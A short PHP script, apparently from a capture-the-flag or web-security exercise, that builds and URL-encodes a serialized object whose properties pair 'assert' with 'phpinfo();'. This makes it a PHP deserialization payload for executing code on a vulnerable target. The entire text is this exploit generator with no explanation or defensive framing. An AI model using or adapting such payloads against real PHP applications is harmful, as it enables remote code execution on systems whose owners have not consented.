<?php
#error_reporting(0);
class HelloPhp
{
    public $a= "phpinfo();";
    public $b= "assert";
}
$a = new HelloPhp();
echo urlencode(serialize($a));
